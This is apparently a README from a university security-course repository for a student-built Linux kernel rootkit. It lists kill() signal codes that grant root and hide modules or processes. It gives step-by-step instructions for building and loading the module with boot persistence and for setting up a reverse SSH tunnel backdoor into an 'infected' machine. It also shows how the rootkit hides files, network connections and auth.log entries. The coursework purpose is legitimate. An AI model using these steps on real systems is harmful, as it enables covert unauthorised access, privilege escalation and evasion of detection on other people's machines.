# S3CW
Repository for Systems and Software Security unit coursework. Included report details the implementation of our linux kernel rootkit, as well as some evaluation and improvements. Mark achieved for this unit: 

## Interacting with the Rootkit

Some commands are accessible by using the system call `kill(pid_t pid, int, sig)`. Running this call with the following `sig` values will use our overridden method:

| `sig` value | Result                                  |
| ----------- | --------------------------------------- |
| 32          | Gain root access                        |
| 33          | Hide the rootkit module from the list   |
| 34          | Unhide the rootkit module from the list |
| 35          | Hide any programs with a PID of `pid`   |



## Building Instructions

### <u>Backdoor Configuration Instructions</u>
Some set up is needed on the computer you wish to use to access the comprimised machine remotely, and without the need for their password. It is highly recomended that you use a Linux based machine to access the comprimised computer, as our method is not verified on Windows or MacOS.

***Turn on SSH port forwarding***

For own computer connecting to rootkit back door:
1. Go to your router settings via a browser (address is typically 192.168.0.1, but your router should show somewhere how to get to the router configuration page).
2. Find your local ip address by using `ifconfig` then comparing the **inet** addresses until you find one that appears on your router settings site.
3. Using `ifconfig`, find your **subnet mask**, and **Default gateway** corresponding to the ip address you just found. Default gateway is typically your ip address with the last section being 1 (i.e. x.x.x.1, where 0 <= x <= 255)
3. We need to ensure our own pc has a static IP on the network to make sure port forwarding always works, and the ssh backdoor tunnel can always be made:

***Linux***
1. Go to **Settings**->**Network**
2. Click on the cog next to the network device that you use to connect to your router (Ethernet or Wifi)
3. Go to the **IPv4** tab, and in **IPv4 Method** select **Manual**. This will give us a static IP
4. Type in the **ip address**, **subnet mask** and **gateway** you found earlier. In the **DNS** field, we can use the Google Public DNS which has address `8.8.8.8`
5. Click **apply**

***Now we have a static IP set, we need to add port forwarding rule***
1. Goto your routers settings
2. Add a port forwarding rule (usually in security or firewall) for port 22 and your local static ip address


### <u>Configuration before installing rootkit</u>
1. You need to generate an ssh rsa keypair. To do this run `ssh-keygen` and hit the *enter* key every time you are prompted for input. If you already have `~/.ssh/id_rsa` and `~/.ssh/id_rsa.pub`, make sure that your user has read write access (can check this through `ls -l ~/.ssh`). If your user doesn't have access (i.e. it says `root` instead), then remove these current keys (may need to do `sudo rm...`) and then run `ssh-keygen` **without `sudo`**.
2. Make sure python is installed, and run `python backdoor_config.py` to set up file with your username, public ssh rsa key, and public ip address. This will be used by the rootkit to set up an ssh backdoor so you can connect to the infected machine. 
3. Move the `backdoor_config.txt` file into the `virus` folder.
4. ONLY MOVE THE **rootkit** FOLDER TO THE MACHINE YOU WANT TO INFECT


### <u>Booting Vagrant</u>
In order to showcase our rootkit, we will be using a Vagrant VM running Ubuntu 12.04. However, any Linux machine (VM or on *bare metal*) with an internet connection and running Ubunutu 12.04 will work. If you use a VM make sure in its network settings the adapter is of type **bridged adapter**.
1. `vagrant up` in folder containing vagrant file
2. If asked which adapter to bridge too when booting vagrant, select the adapter you use to connect to the internet (can find this out using `ifconfig` and seing which one has your static ip address).
3. Move rootkit folder to 'guest' folder (in same directory as vagrant file is in)
4. `vagrant ssh` 

### <u>Setting up rootkit with loading on boot</u>
The rootkit will make itself boot by editing `/modules/etc`, but you need to follow these steps first:
1. ``` sudo apt-get install linux-headers-`uname -r` ```
2. `sudo mkdir /lib/modules/3.2.0-126-generic/kernel/drivers/rootkit`
3. `sudo cp /vagrant/* /lib/modules/3.2.0-126-generic/kernel/drivers/rootkit -r`
4. `cd /lib/modules/3.2.0-126-generic/kernel/drivers/rootkit`
5. `sudo make all`
6. `sudo depmod` which resets relevant systems to allow our module to be loaded on boot
7. `sudo insmod rootkit.ko`
8. To establish backdoor, go to `cd virus` and then run `./backdoor`. You will need to enter your home computer's password for ssh key exchange
Warning: there is no way to remove the rootkit after this - if you want to recompile then either use signals to disable some functionality or reset your box.

### <u>Using backdoor</u>
1. Whilst you have access to the system you are infecting, run the command `whoami` and make a note of the result that is produced. We will need this to ssh into the system
2. We have set up a reverse ssh tunnel, meaning that whenever our router sees we are sending a request to `localhost` on port `7000` it will divert this to port `22` of our infected system
3. To access the infected system, simply type the command `ssh targetUser@localhost -p 7000 -i ~/.ssh/id_rsa` and you will have access to their system without the need for their password

### <u>Showing Rootkit features</u>
1. To see that our rootkit is not in modules list, run `sudo lsmod` and inspect the list
2. To see that our rootkit and virus files are hidden, go to `cd /lib/modules/3.2.0-126-generic/kernel/drivers/`. Running `ls`, `l`, `dir` will yield that `rootkit/` cannot be seen, as well as with `ls rootkit` etc. once you have `cd rootkit` the same can be seen for `virus` file with out payload.
3. To see that backdoor connections are hidden, we can run any networking command: `netstat`, `who`, `last`, `w`, `ss` and our ip address or any ssh connections will be hidden
4. opening the `/var/log/auth.log` file will not show evidence of our ssh connection once the rootkit has been loaded
5. To demonstrate root access, our payload program calls the hooked `kill` syscall when making a bash script. Running `./payload` or `./payload root` will give us a root terminal. This can be confirmed by running `whoami` 
6. In order to demonstrate program hiding we have to options. First by running our `./payload` script in our `/rootkit/virus/` folder wil give us a bash terminal. Whilst running `ps` or `top` will show our payload process, if we ssh in again to the compromised VM and run `ps` or `top` from this terminal, we see that it is infact hidden. Second, we can find a process ID using `ps` or `top`, and then execute `./payload hidepid $PID` and this will hide any process.
